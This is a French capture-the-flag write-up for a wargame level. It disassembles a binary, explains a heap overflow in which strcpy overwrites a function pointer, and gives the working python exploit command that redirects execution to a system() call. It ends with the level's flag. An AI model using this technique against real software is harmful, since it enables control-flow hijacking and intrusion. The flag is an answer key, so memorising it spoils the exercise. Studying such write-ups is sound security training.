```
08048454 <n>:
 8048454:	55                   	push   ebp
 8048455:	89 e5                	mov    ebp,esp
 8048457:	83 ec 18             	sub    esp,0x18
 804845a:	c7 04 24 b0 85 04 08 	mov    DWORD PTR [esp],0x80485b0
 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
 8048466:	c9                   	leave  
 8048467:	c3                   	ret    

08048468 <m>:
 8048468:	55                   	push   ebp
 8048469:	89 e5                	mov    ebp,esp
 804846b:	83 ec 18             	sub    esp,0x18
 804846e:	c7 04 24 d1 85 04 08 	mov    DWORD PTR [esp],0x80485d1
 8048475:	e8 e6 fe ff ff       	call   8048360 <puts@plt>
 804847a:	c9                   	leave  
 804847b:	c3                   	ret    

0804847c <main>:
 804847c:	55                   	push   ebp
 804847d:	89 e5                	mov    ebp,esp
 804847f:	83 e4 f0             	and    esp,0xfffffff0
 8048482:	83 ec 20             	sub    esp,0x20
 8048485:	c7 04 24 40 00 00 00 	mov    DWORD PTR [esp],0x40		; 64
 804848c:	e8 bf fe ff ff       	call   8048350 <malloc@plt>
 8048491:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax	; (void *) ptr
 8048495:	c7 04 24 04 00 00 00 	mov    DWORD PTR [esp],0x4
 804849c:	e8 af fe ff ff       	call   8048350 <malloc@plt>
 80484a1:	89 44 24 18          	mov    DWORD PTR [esp+0x18],eax
 80484a5:	ba 68 84 04 08       	mov    edx,0x8048468
 80484aa:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484ae:	89 10                	mov    DWORD PTR [eax],edx
 80484b0:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]	; argv[0]
 80484b3:	83 c0 04             	add    eax,0x4					; argv[1]
 80484b6:	8b 00                	mov    eax,DWORD PTR [eax]
 80484b8:	89 c2                	mov    edx,eax
 80484ba:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]	; (void *) ptr
 80484be:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx	; argv[1]
 80484c2:	89 04 24             	mov    DWORD PTR [esp],eax		; (void *) ptr
 80484c5:	e8 76 fe ff ff       	call   8048340 <strcpy@plt>		; strcpy(ptr, argv[1]);
 80484ca:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]	; pointeur contenu dans la 2nd malloc
 80484ce:	8b 00                	mov    eax,DWORD PTR [eax]		; on le destack
 80484d0:	ff d0                	call   eax						; on l'appel
 80484d2:	c9                   	leave  
 80484d3:	c3                   	ret    
```

Ici, heap buffer overflow, on a juste a overflow les 64 premiers caractères mallocs, et quand c'est fait, on va pouvoir écrire dans l'adresse contenu du second malloc et qui va être appelée. Tout ça évidemment en passant un argument au binaire.

Exploit : `python -c 'print("A" * 64 + "\x54\x84\x04\x08")' | xargs -0 ./level6`

Mais ça ne marche pas. Après avoir regardé le contenu du buffer avant et après le `strcpy`, je me suis rendu compte qu'il manquit 8 octets dans notre exploit.

`./level6 "$(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')"`

Flag: `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`